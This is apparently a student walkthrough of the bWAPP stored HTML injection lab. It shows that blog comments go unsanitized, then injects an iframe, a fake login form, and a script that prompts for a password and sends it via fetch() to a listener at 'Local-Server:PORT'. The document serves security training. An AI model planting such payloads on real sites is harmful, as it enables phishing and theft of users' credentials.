/// HTML Injection - Stored (Blog) ///

Selecting "HTML Injection - Stored (Blog)", reveals us a type of blog
which we can send our comments into it. how does it works? let's test it.
try writing some dummy text inside of it with "< >" tags first.


After submit, we can see our "< >" inside the form. are they SANITIZE or filtered?
By checking the source-code, we see nothing filters or replace the tags we insert.
Now, by viewing the source code of this page ( i will add image next to this document ), we can see
that nothing is cheking the user input, and it add as it is.
Let's try inject something, and see the results


<iframe src="http://Local-Server" widgth="300" height="400"></iframe>

As you can see, i have injected an iframe tag using my bWAPP address
and now the machine reflected to every person who will visit the page.
Now, can we make something more nice and malicious?
Let's try make a username/password form, and by this getting the victim's password.
the following CODE sould help us:


<form action="Local-Server:PORT">
<label for="#">Username:</label><br>
<input type="text" name="user"><br>
<label for="#">Password:</label><br>
<input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>


Another action could be tricking the user into think
they have to login again because end session ends. let's try the following CODE:

<script>var malicious = prompt("Enter your password again please");
fetch("http://Local-Server:PORT/"+malicious);
alert("authenticated, OK.");
</script>


and as you can see, the victim password has been sent to our listener.
Thanks for watching :)
